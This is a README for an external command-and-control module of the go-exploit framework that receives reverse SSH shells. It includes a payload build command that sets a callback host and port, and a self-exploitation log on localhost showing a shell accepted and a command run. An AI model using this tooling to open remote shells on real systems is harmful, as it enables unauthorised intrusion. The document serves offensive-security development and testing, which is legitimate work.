# External C2: SSH

A [go-exploit](https://github.com/vulncheck-oss/go-exploit) external C2 module that supports reverse SSH shells. It additionally acts as a demonstration of how to integrate external C2 profiles to your favorite payloads. The goal is not to provide a fully weaponized payload with evasion and advanced techniques, but show how to create channels for payloads that *can* implement stronger evasion modules and integrate easily into go-exploit.

## Structure

- The core `c2ssh` package that implements the interfaces and structures for setting up a server to catch SSH payloads
- `./payload` contains the implementation for payloads to be used by an exploit, this is functionally the SSH client and a thin wrapper around exec based around server response
- `./example` contains a self-exploitation test that executes a compiled example payload

## Example usage

1. Compile the payload for use in the exploit to make it accessible to the exploit, this is currently decouple from the framework because you aren't always using Go payloads :)
2. Execute the exploit

```
go build -ldflags "-s -w -X main.Rshost=127.0.0.1 -X main.Rsport=2223" -o reverse_shell
```

```
poptart@grimm $ go run example/exploit.go -lhost 127.0.0.1 -lport 2222 -rhost 127.0.0.1 -rport 1337 -e -fll DEBUG -ell DEBUG -t 0
time=2024-08-06T12:09:02.762-06:00 level=DEBUG msg="Using the HTTP User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
time=2024-08-06T12:09:02.763-06:00 level=STATUS msg="Starting target" index=0 host=127.0.0.1 port=1337 ssl=false "ssl auto"=false
time=2024-08-06T12:09:02.763-06:00 level=DEBUG msg="External SSH Listener starting: 127.0.0.1:2222"
time=2024-08-06T12:09:02.766-06:00 level=DEBUG msg="SSH: Handshaking for 127.0.0.1:38878"
time=2024-08-06T12:09:02.768-06:00 level=STATUS msg="Active shell SSH: Connection accepted from poptart@127.0.0.1:38878 session: 451e905e22ffbc7ab6235ad73379eeea2c65ba532405d81a431e1c5159ba1179 (SSH-2.0-OpenSSH_9.7)"
id
time=2024-08-06T12:09:04.725-06:00 level=STATUS msg="Running command on SSH client: 'id'"
time=2024-08-06T12:09:08.812-06:00 level=SUCCESS msg="uid=1000(poptart) gid=100(users) groups=100(users),1(wheel),67(libvirtd)\n"
```
